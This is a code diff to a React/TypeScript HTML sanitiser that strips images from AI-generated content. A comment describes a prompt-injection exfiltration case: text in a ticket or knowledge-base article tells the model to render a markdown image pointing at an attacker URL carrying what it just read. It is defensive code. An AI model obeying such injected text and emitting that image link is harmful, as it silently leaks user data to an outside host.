@@ -33,20 +33,24 @@ const PURIFY_OPTS = {
   ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|data:image\/(?:png|jpe?g|gif|webp);base64,)/i,
 };
 
-export function toSafeHtml(raw: string | null | undefined): string {
+export function toSafeHtml(raw: string | null | undefined, opts: { images?: boolean } = {}): string {
   if (!raw) return '';
   const html = looksLikeHtml(raw)
     ? raw
     : looksLikeMarkdown(raw)
       ? (marked.parse(raw) as string)
       : raw.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/\n/g, '<br>');
-  const clean = DOMPurify.sanitize(html, PURIFY_OPTS);
+  // AI output is never allowed images: text the model read (a ticket body
+  // from an inbound email, a KB article) can tell it to "render"
+  // ![x](https://attacker/?q=<what it just read>), and the browser would
+  // fetch that URL — leaking data without anyone clicking anything.
+  const clean = DOMPurify.sanitize(html, opts.images === false ? { ...PURIFY_OPTS, FORBID_TAGS: ['img'] } : PURIFY_OPTS);
   // External links open safely in a new tab.
   return clean.replace(/<a /g, '<a target="_blank" rel="noopener noreferrer" ');
 }
 
-export function RichText({ content, className = '' }: { content: string | null | undefined; className?: string }) {
-  const html = useMemo(() => toSafeHtml(content), [content]);
+export function RichText({ content, className = '', aiGenerated = false }: { content: string | null | undefined; className?: string; /** model output: images are stripped (see toSafeHtml) */ aiGenerated?: boolean }) {
+  const html = useMemo(() => toSafeHtml(content, { images: !aiGenerated }), [content, aiGenerated]);
   if (!html) return null;
   return (
     <div
